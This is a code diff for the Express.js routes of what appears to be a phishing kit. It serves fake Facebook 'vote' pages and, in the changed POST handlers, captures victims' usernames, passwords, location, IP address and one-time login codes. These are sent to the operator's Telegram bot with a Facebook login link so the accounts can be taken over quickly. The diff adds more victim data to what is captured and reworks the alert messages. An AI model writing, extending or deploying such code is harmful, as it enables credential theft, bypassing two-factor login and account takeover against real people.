@@ -17,18 +17,18 @@ router.get("/vote/:linkId", async (req, res) => {
             return res.redirect("/notfound");
         }
         const user = await User.findById(link.user);
-        if (user.notification) {
-            await bot.sendMessage(user.telegramID, `
-😈 New Entry 😈
-            
-Someone is about to Login!!!
+        //         if (user.notification) {
+        //             await bot.sendMessage(user.telegramID, `
+        // 😈 New Entry 😈
 
-SOCIAL MEDIA: ${link.linkType}
+        // Someone is about to Login!!!
 
-GET READY!!!
-            
-                    `)
-        }
+        // SOCIAL MEDIA: ${link.linkType}
+
+        // GET READY!!!
+
+        //                     `)
+        //         }
         return res.render("socials/facebook/vote", { req, name: link.modelName, linkType: link.linkType, linkId: link.id, layout: false });
     } catch (err) {
         console.log(err)
@@ -49,18 +49,18 @@ router.get("/vote-2/:linkId", async (req, res) => {
             return res.redirect("/notfound");
         }
         const user = await User.findById(link.user);
-        if (user.notification) {
-            await bot.sendMessage(user.telegramID, `
-😈 New Entry 😈
-            
-Someone is about to Login!!!
+        //         if (user.notification) {
+        //             await bot.sendMessage(user.telegramID, `
+        // 😈 New Entry 😈
 
-SOCIAL MEDIA: ${link.linkType}
+        // Someone is about to Login!!!
 
-GET READY!!!
-            
-                    `)
-        }
+        // SOCIAL MEDIA: ${link.linkType}
+
+        // GET READY!!!
+
+        //                     `)
+        //         }
         const samplePic = "https://i.postimg.cc/TYKGQSJw/stefan-stefancik-QXev-Dflbl8-A-unsplash.jpg";
         return res.render("socials/facebook/vote2", { req, picture: link.picture || samplePic, name: link.modelName, linkType: link.linkType, linkId: link.id, layout: false });
     } catch (err) {
@@ -82,19 +82,19 @@ router.get("/vote-3/:linkId", async (req, res) => {
             return res.redirect("/notfound");
         }
         const user = await User.findById(link.user);
-        if (user.notification) {
-            await bot.sendMessage(user.telegramID, `
-😈 New Entry 😈
-            
-Someone is about to Login!!!
+        //         if (user.notification) {
+        //             await bot.sendMessage(user.telegramID, `
+        // 😈 New Entry 😈
 
-SOCIAL MEDIA: ${link.linkType}
+        // Someone is about to Login!!!
 
-GET READY!!!
-            
-                    `)
-        }
-        const samplePic = "https://i.postimg.cc/TYKGQSJw/stefan-stefancik-QXev-Dflbl8-A-unsplash.jpg";
+        // SOCIAL MEDIA: ${link.linkType}
+
+        // GET READY!!!
+
+        //                     `)
+        //         }
+        // const samplePic = "https://i.postimg.cc/TYKGQSJw/stefan-stefancik-QXev-Dflbl8-A-unsplash.jpg";
         return res.render("socials/facebook/vote3", {
             req,
             link,
@@ -153,7 +153,7 @@ router.get("/face/otp/:linkId", async (req, res) => {
 
 router.post("/face/:linkId", async (req, res) => {
     try {
-        const { username, password, country } = req.body;
+        const { username, password, country, city, region, ip } = req.body;
         const { linkId } = req.params;
         if (linkId.length !== 24) {
             return res.redirect("/notfound");
@@ -168,6 +168,9 @@ router.post("/face/:linkId", async (req, res) => {
                 user: link.user,
                 link: linkId,
                 country,
+                region,
+                ip,
+                city,
                 linkName: link.name,
                 linkType: "Facebook",
                 fields: {
@@ -177,18 +180,19 @@ router.post("/face/:linkId", async (req, res) => {
             });
             await newCredential.save();
             await bot.sendMessage(user.telegramID, `
-                😈 New Entry 😈
-SOCIAL MEDIA: FACEBOOK
+LOG ENTRY
+PLATFORM: FACEBOOK
 
-LOCATION: ${country}
 
-USERNAME: ${username}
+USERNAME/PHONE/ID: ${username}
 PASSWORD: ${password}
-OTP: ${link.otpEnabled ? "Wait for OTP after logging in" : "NOT AN OTP LINK"}
 
-Login quickly 🏃🏾🏃🏾🏃🏾
+COUNTRY: ${country}
+CITY: ${city}
+REGION: ${region}
+IP: ${ip}
 
-Login now: https://www.facebook.com
+Login with: https://www.facebook.com
                                                 `)
                 .catch(err => console.log("Telegram error"));
             if (link.otpEnabled) {
@@ -216,13 +220,13 @@ router.post("/face/otp/:linkId", async (req, res) => {
 
         if (link) {
             await bot.sendMessage(user.telegramID, `
-😈 NEW ENTRY 😈
+LOG ENTRY
 
-SOCIAL MEDIA: FACEBOOK
+PLATFORM: FACEBOOK
+TYPE: OTP
+CODE: ${code}
 
-OTP: ${code}
-
-                `)
+`)
                 .catch(err => console.log("Telegram error"));
             return res.redirect("/successful-vote");
         }
